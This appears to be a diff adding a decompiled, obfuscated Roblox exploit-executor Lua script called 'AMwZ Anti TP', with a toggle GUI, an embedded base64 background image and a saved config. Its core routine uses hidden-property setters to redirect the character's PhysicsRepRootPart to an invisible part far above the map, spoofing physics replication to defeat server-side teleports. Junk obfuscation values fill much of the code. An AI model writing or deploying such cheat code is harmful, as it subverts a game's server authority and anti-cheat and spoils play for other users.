@@ -1,0 +1,1128 @@
+local t1 = {}
+local t2 = {}
+local v3 = unpack or table.unpack
+local v4
+repeat
+    v4 = v3
+    task.wait()
+    t1.value2 = game:IsLoaded()
+    v3 = v4
+until t1.value2
+t1.value2 = game:GetService("Players")
+t2.value1 = game:GetService("RunService")
+
+local UserInputService = game:GetService("UserInputService")
+
+t2.value2 = game:GetService("TweenService")
+
+local _game = game
+local GetService = _game.GetService
+t1.value4 = "\148\221+u\171y;И\014\140"
+t1.value3 = GetService
+t1.value3 = t1.value3(_game, "HttpService")
+t2.value3 = t1.value3
+t1.value3 = t1.value2.LocalPlayer
+t2.value4 = t1.value3
+t2.value5 = t2.value4:WaitForChild("PlayerGui")
+
+local v8 = type(getgenv) == "function" and getgenv()
+t1.value1 = t1.value1
+if not v8 then
+    v8 = _G
+end
+function t1.value4()
+    local AMwZ_AntiTP = t2.value5:FindFirstChild("AMwZ_AntiTP")
+
+    if AMwZ_AntiTP then
+        AMwZ_AntiTP:Destroy()
+    end
+
+    local BootswareBestAntiTPBat = t2.value5:FindFirstChild("BootswareBestAntiTPBat")
+
+    if BootswareBestAntiTPBat then
+        BootswareBestAntiTPBat:Destroy()
+    end
+end
+t2.value6 = v8
+t1.value6 = "\v\141\198 NsK\150"
+t1.value5 = "u16\006\129\194\210\000\017n\169\207<b\146\180\213f"
+pcall(t1.value4)
+t2.value7 = nil
+function t1.value4(p1)
+    if type(writefile) ~= "function" then
+        return
+    end
+    local concat = table.concat
+    local u57 = concat(p1)
+    local u58
+    pcall(function()
+        local _crypt = crypt
+
+        if _crypt then
+            _crypt = crypt.base64decode
+        end
+
+        if _crypt then
+            u58 = crypt.base64decode(u57)
+        end
+    end)
+    if not u58 then
+        pcall(function()
+            if base64_decode then
+                u58 = base64_decode(u57)
+            end
+        end)
+    end
+    if not u58 then
+        local v59 = u57:gsub("[^%w%+%/=]", "")
+        local t3 = {}
+
+        for i = 1, #v59, 4 do
+            local v62 = i
+
+            local function v63(p2)
+                local v152 = not p2
+
+                if not v152 then
+                    v152 = p2 == "" or p2 == "="
+                end
+
+                if v152 then
+                    return 0
+                end
+
+                local v153 = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):find(p2, 1, true)
+
+                return v153 and v153 - 1 or 0
+            end
+
+            local v64 = v63(v59:sub(v62, v62)) * 262144 + v63(v59:sub(v62 + 1, v62 + 1)) * 4096 + v63(v59:sub(v62 + 2, v62 + 2)) * 64 + v63(v59:sub(v62 + 3, v62 + 3))
+
+            t3[#t3 + 1] = string.char(math.floor(v64 / 65536) % 256)
+
+            if v59:sub(v62 + 2, v62 + 2) ~= "=" then
+                t3[#t3 + 1] = string.char(math.floor(v64 / 256) % 256)
+            end
+
+            if v59:sub(v62 + 3, v62 + 3) ~= "=" then
+                t3[#t3 + 1] = string.char(v64 % 256)
+            end
+        end
+
+        u58 = table.concat(t3)
+    end
+    if u58 and #u58 > 50 then
+        pcall(writefile, t2.value7, u58)
+    end
+end
+t2.value7 = "AMwZ_AntiTP_bg.jpg"
+t2.value8 = t1.value4
+pcall(function()
+    t2.value8({
+		"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"
+	})
+end)
+
+local ok, result = pcall(function()
+    local _getcustomasset = getcustomasset
+
+    if _getcustomasset then
+        _getcustomasset = isfile and isfile(t2.value7)
+    end
+
+    if _getcustomasset then
+        return getcustomasset(t2.value7)
+    end
+end)
+local v11 = ok and result
+if not v11 then
+    v11 = ""
+end
+t2.value9 = "AMwZ_AntiTP_Config.json"
+t1.value8 = 23335222979186
+t1.value5 = false
+t2.value10 = t1.value5
+local _Enum = Enum
+t1.value9 = 12275578852948
+t1.value10 = "\0166\232\154\193r\216"
+local KeyCode = _Enum.KeyCode
+t1.value7 = 6762923478093
+t1.value11 = "\133\153k\215\235\215\014t\018"
+t1.value5 = KeyCode.T
+t2.value11 = t1.value5
+t1.value5 = false
+t1.value12 = 2257827628059
+t2.value12 = t1.value5
+t2.value13 = "V3"
+t1.value13 = "\218\202\225\206\219\208\002H"
+t1.value5 = false
+t2.value14 = t1.value5
+t1.value5 = {
+	alive = true,
+	enabled = false,
+	character = nil,
+	rootPart = nil,
+	fakeRoot = nil,
+	stepConnection = nil
+}
+t2.value15 = t1.value5
+t1.value5 = t2.value6
+t1.value5.__AMWZ_ANTITP_RUNTIME = t2.value15
+function t2.value16()
+    pcall(function()
+        if writefile then
+            local _writefile = writefile
+            local value9 = t2.value9
+            local value3 = t2.value3
+            local value10 = t2.value10
+            local value11Name = t2.value11.Name
+            local value13 = t2.value13
+
+            _writefile(value9, value3:JSONEncode({
+				enabled = value10,
+				key = value11Name,
+				version = value13
+			}))
+        end
+    end)
+end
+pcall(function()
+    if isfile and isfile(t2.value9) then
+        local value3 = t2.value3
+        local _readfile = readfile
+        local JSONDecode = value3.JSONDecode
+        local t4 = { _readfile(t2.value9) }
+        local v70 = JSONDecode(value3, v4(t4))
+
+        if type(v70) == "table" then
+            if v70.enabled ~= nil then
+                t2.value10 = v70.enabled == true
+            end
+
+            if type(v70.key) == "string" then
+                local ok2, result2 = pcall(function()
+                    return Enum.KeyCode[v70.key]
+                end)
+
+                if ok2 and result2 then
+                    t2.value11 = result2
+                end
+            end
+
+            if type(v70.version) == "string" then
+                t2.value13 = v70.version
+            end
+        end
+    end
+end)
+t1.value8 = "Vector3"
+t1.value7 = 100000000
+t2.value17 = t1.value7
+t1.value7 = Vector3.zero
+t2.value18 = t1.value7
+local function v14(...)
+    for i = 1, select("#", ...) do
+        local v74 = select(i, ...)
+        local v75 = rawget(t2.value6, v74)
+
+        if type(v75) == "function" then
+            return v75
+        end
+
+        local v76 = rawget(_G, v74)
+
+        if type(v76) == "function" then
+            return v76
+        end
+    end
+
+    return nil
+end
+function t1.value11(p3)
+    if not p3 then
+        return false
+    end
+
+    local ok3, result3 = pcall(function()
+        return p3:IsA("BasePart")
+    end)
+
+    if ok3 then
+        ok3 = result3 == true
+    end
+
+    return ok3
+end
+function t1.value10(p4, p5, p6)
+    if not p4 then
+        return false
+    end
+
+    local v83 = v14("sethiddenproperty", "set_hidden_property", "sethiddenprop")
+
+    if v83 and pcall(v83, p4, p5, p6) then
+        return true
+    end
+
+    return pcall(function()
+        p4[p5] = p6
+    end)
+end
+function t1.value6()
+    if t2.value15.fakeRoot then
+        pcall(function()
+            t2.value15.fakeRoot:Destroy()
+        end)
+        t2.value15.fakeRoot = nil
+    end
+end
+t2.value19 = t1.value10
+function t2.value20(p7, p8)
+    if not p7 then
+        return false, nil
+    end
+
+    local v86 = v14("gethiddenproperty", "get_hidden_property", "gethiddenprop")
+
+    if v86 then
+        local ok4, result4 = pcall(v86, p7, p8)
+
+        if ok4 then
+            return true, result4
+        end
+    end
+
+    local ok5, result5 = pcall(function()
+        return p7[p8]
+    end)
+
+    return ok5, result5
+end
+t2.value21 = nil
+t2.value21 = t1.value11
+function t1.value9(p9)
+    if not p9 then
+        p9 = t2.value4.Character
+    end
+
+    local v94 = p9
+
+    if not v94 then
+        return nil
+    end
+
+    local ok6, result6 = pcall(function()
+        return v94:FindFirstChild("HumanoidRootPart")
+    end)
+
+    if ok6 then
+        ok6 = t2.value21(result6)
+    end
+
+    if ok6 then
+        return result6
+    end
+
+    return nil
+end
+t2.value22 = t1.value9
+t2.value23 = t1.value6
+function t1.value13(p10)
+    t2.value23()
+
+    if not t2.value21(p10) then
+        return nil
+    end
+
+    local Part = Instance.new("Part")
+
+    Part.Name = "AMwZFakeRepRoot"
+    Part.Size = Vector3.new(2, 2, 1)
+    Part.Transparency = 1
+    Part.Anchored = true
+    Part.CanCollide = false
+    Part.CanQuery = false
+    Part.CanTouch = false
+    Part.Massless = true
+    Part.CFrame = CFrame.new(p10.Position.X, t2.value17, p10.Position.Z)
+    Part.Parent = workspace
+    t2.value15.fakeRoot = Part
+
+    return Part
+end
+t2.value24 = t1.value13
+t2.value25 = nil
+function t2.value25(p11, p12)
+    if not t2.value21(p11) or not t2.value21(p12) then
+        return
+    end
+
+    t2.value19(p11, "PhysicsRepRootPart", p12)
+end
+function t2.value26()
+    local v100 = not t2.value15.enabled
+    if not v100 then
+        v100 = not t2.value15.alive
+    end
+    if v100 then
+        return
+    end
+    local rootPart = t2.value15.rootPart
+    local v102 = not t2.value21(rootPart)
+    if not v102 then
+        v102 = not rootPart.Parent
+    end
+    if v102 then
+        rootPart = t2.value22(t2.value15.character)
+        t2.value15.rootPart = rootPart
+
+        if not rootPart then
+            return
+        end
+    end
+    local v103 = not t2.value21(t2.value15.fakeRoot)
+    if not v103 then
+        v103 = not t2.value15.fakeRoot.Parent
+    end
+    if v103 then
+        local v104 = t2.value24(rootPart)
+
+        if v104 then
+            t2.value25(rootPart, v104)
+        end
+
+        return
+    end
+    local fakeRoot = t2.value15.fakeRoot
+    local u106 = fakeRoot
+    local ok7, result7, v109 = pcall(function()
+        return rootPart.Position, u106.Position
+    end)
+    local v110 = result7
+    if ok7 then
+        ok7 = math.abs(v110.X - v109.X) > 0.01
+
+        if not ok7 then
+            ok7 = math.abs(v110.Z - v109.Z) > 0.01 or math.abs(v109.Y - t2.value17) > 0.01
+        end
+    end
+    if ok7 then
+        pcall(function()
+            u106.CFrame = CFrame.new(v110.X, t2.value17, v110.Z)
+        end)
+    end
+    pcall(function()
+        u106.Anchored = true
+        u106.AssemblyLinearVelocity = t2.value18
+    end)
+    local v111, v112 = t2.value20(rootPart, "PhysicsRepRootPart")
+    local v113 = not v111
+    if not v113 then
+        v113 = v112 ~= u106
+    end
+    if v113 then
+        t2.value19(rootPart, "PhysicsRepRootPart", u106)
+    end
+end
+function t2.value27()
+    if t2.value15.stepConnection then
+        pcall(function()
+            t2.value15.stepConnection:Disconnect()
+        end)
+        t2.value15.stepConnection = nil
+    end
+end
+t2.value28 = nil
+function t2.value28()
+    t2.value27()
+    t2.value15.stepConnection = t2.value1.Stepped:Connect(t2.value26)
+end
+function t2.value29(p13)
+    local v115 = p13 == true
+
+    t2.value10 = v115
+    t2.value15.enabled = v115
+
+    if v115 then
+        local v116 = t2.value22(t2.value4.Character)
+
+        t2.value15.character = t2.value4.Character
+        t2.value15.rootPart = v116
+
+        if not v116 then
+            t2.value10 = false
+            t2.value15.enabled = false
+            t2.value16()
+
+            return false
+        end
+
+        local v117 = t2.value24(v116)
+
+        t2.value25(v116, v117)
+        t2.value28()
+    else
+        t2.value27()
+
+        local rootPart = t2.value15.rootPart
+
+        if t2.value21(rootPart) then
+            t2.value19(rootPart, "PhysicsRepRootPart", rootPart)
+        end
+
+        t2.value23()
+    end
+
+    t2.value16()
+
+    return t2.value10
+end
+function t2.value30(p14)
+    t2.value15.character = p14
+    t2.value15.rootPart = t2.value22(p14)
+
+    if t2.value15.enabled then
+        t2.value23()
+
+        local rootPart = t2.value15.rootPart
+
+        if not rootPart and p14 then
+            local ok8, result8 = pcall(function()
+                return p14:WaitForChild("HumanoidRootPart", 8)
+            end)
+
+            if ok8 then
+                ok8 = t2.value21(result8)
+            end
+
+            if ok8 then
+                rootPart = result8
+                t2.value15.rootPart = rootPart
+            end
+        end
+
+        if rootPart then
+            local v123 = t2.value24(rootPart)
+
+            t2.value25(rootPart, v123)
+            t2.value28()
+        end
+    end
+end
+t2.value4.CharacterAdded:Connect(function(character)
+    task.defer(t2.value30, character)
+end)
+
+if t2.value4.Character then
+    t2.value30(t2.value4.Character)
+end
+t2.value31 = 175
+t1.value14 = "Instance"
+t2.value32 = 40
+t2.value33 = Instance.new("ScreenGui")
+t2.value33.Name = "AMwZ_AntiTP"
+t2.value33.IgnoreGuiInset = true
+t2.value33.ResetOnSpawn = false
+t2.value33.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+t2.value33.Parent = t2.value5
+t1.value14 = Instance.new("Frame")
+t2.value34 = t1.value14
+t2.value34.Name = "Main"
+t2.value34.Active = true
+t2.value34.ClipsDescendants = true
+t2.value34.Position = UDim2.new(0.5, -130, 0.5, -88)
+t2.value34.Size = UDim2.new(0, 260, 0, t2.value31)
+t2.value34.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+t2.value34.BackgroundTransparency = 1
+t2.value34.BorderSizePixel = 0
+t2.value34.Parent = t2.value33
+Instance.new("UICorner", t2.value34).CornerRadius = UDim.new(0, 16)
+t2.value35 = Instance.new("UIStroke")
+
+local value35 = t2.value35
+local fromRGB = Color3.fromRGB
+t1.value15 = 180
+t1.value16 = 255
+value35.Color = fromRGB(0, t1.value15, t1.value16)
+t2.value35.Thickness = 1.3
+t1.value15 = "n\175\019\167\250\142Z\172\\\173^\030"
+t1.value16 = 29316974900563
+t2.value35.Transparency = 0.3
+local value35_2 = t2.value35
+t1.value15 = "\150vN\140\252J"
+t1.value16 = 32558792899385
+value35_2.Parent = t2.value34
+local ImageLabel = Instance.new("ImageLabel")
+
+ImageLabel.Name = "BG"
+t1.value15 = "5\199$\139"
+t1.value16 = 34607198437107
+ImageLabel.ZIndex = 0
+ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+t1.value16 = 17495728758739
+t1.value15 = "\248\237\029W\021\127\194u\193~\205X\031\003\150O\031\238\184W\254."
+ImageLabel.BackgroundTransparency = 1
+t1.value15 = "\019\152f\170\144\020\245e \205\\\128\015\234\213"
+t1.value16 = 5769111243390
+t1.value16 = 29203445200158
+t1.value15 = "8\145\1534["
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Image = v11
+ImageLabel.ImageTransparency = 0
+t1.value16 = 2709009499373
+t1.value15 = "\005#\144\t8\174s\145\222"
+ImageLabel.ScaleType = Enum.ScaleType.Crop
+ImageLabel.Parent = t2.value34
+local UICorner = Instance.new("UICorner", ImageLabel)
+local new = UDim.new
+t1.value16 = 16
+t1.value15 = 0
+t1.value17 = 22909673466284
+UICorner.CornerRadius = new(t1.value15, t1.value16)
+
+local Frame = Instance.new("Frame")
+
+Frame.ZIndex = 5
+local new2 = UDim2.new
+t1.value16 = 6
+t1.value15 = 0
+Frame.Position = new2(t1.value15, t1.value16, 0, 4)
+Frame.Size = UDim2.new(1, -12, 0, 34)
+Frame.BackgroundTransparency = 1
+Frame.Parent = t2.value34
+local TextLabel = Instance.new("TextLabel")
+
+TextLabel.ZIndex = 6
+local new3 = UDim2.new
+t1.value16 = 0
+t1.value17 = "\134\185\215"
+TextLabel.Position = new3(t1.value16, 8, 0, 0)
+TextLabel.Size = UDim2.new(1, -50, 1, 0)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "AMwZ  Anti TP"
+TextLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
+TextLabel.TextSize = 13
+t1.value15 = Enum.Font
+t1.value20 = 16992302341864
+t1.value17 = "<ޏ\1701\245!\243\215Շ"
+TextLabel.Font = t1.value15.GothamBlack
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.Parent = Frame
+t2.value36 = Instance.new("TextButton")
+t2.value36.ZIndex = 7
+t2.value36.Position = UDim2.new(1, -32, 0.5, -11)
+
+local value36 = t2.value36
+t1.value16 = UDim2.new
+t1.value17 = 0
+t1.value20 = 22
+value36.Size = t1.value16(0, 28, t1.value17, t1.value20)
+t2.value36.BackgroundColor3 = Color3.fromRGB(0, 40, 70)
+
+local value36_2 = t2.value36
+t1.value20 = 26051861622627
+t1.value17 = 22066156431395
+t1.value17 = 25710253190852
+t1.value16 = 0.2
+value36_2.BackgroundTransparency = t1.value16
+t2.value36.BorderSizePixel = 0
+t2.value36.Text = "–"
+t2.value36.TextColor3 = Color3.fromRGB(0, 220, 255)
+t2.value36.TextSize = 14
+t2.value36.Font = Enum.Font.GothamBold
+t2.value36.AutoButtonColor = false
+t2.value36.Parent = Frame
+t1.value15 = Instance.new("UICorner", t2.value36)
+
+local uDim = UDim.new(0, 7)
+
+t1.value16 = "Instance"
+t1.value20 = 12722700883748
+t1.value15.CornerRadius = uDim
+local new4 = Instance.new
+t1.value17 = "\150\029/\243\218"
+t1.value20 = 20290493687016
+t1.value15 = new4("Frame")
+t2.value37 = t1.value15
+t2.value37.Name = "Divider"
+t2.value37.ZIndex = 5
+t1.value15 = t2.value37
+t1.value20 = 27294883328422
+t1.value17 = "{E\172\224\174;i\031"
+local _UDim2 = UDim2
+t1.value20 = 0
+t1.value17 = 8
+local v30 = _UDim2.new(0, t1.value17, t1.value20, 40)
+
+t1.value17 = "H0\198\227"
+t1.value20 = 11598249547032
+t1.value15.Position = v30
+t1.value15 = t2.value37
+local new5 = UDim2.new
+t1.value17 = -16
+t1.value20 = 0
+t1.value15.Size = new5(1, t1.value17, t1.value20, 1)
+t1.value15 = t2.value37
+t1.value17 = "\162\156\146\149,\193pG\245q0\"\254\135\234\216"
+t1.value20 = 34634201202431
+local fromRGB2 = Color3.fromRGB
+t1.value20 = 255
+t1.value17 = 180
+t1.value15.BackgroundColor3 = fromRGB2(0, t1.value17, t1.value20)
+t1.value15 = t2.value37
+t1.value17 = "i\217\002\147\014\"\029iW6\191\153\213Y\220\235fx/\177m\248"
+t1.value20 = 29111237571827
+t1.value15.BackgroundTransparency = 0.5
+t2.value37.BorderSizePixel = 0
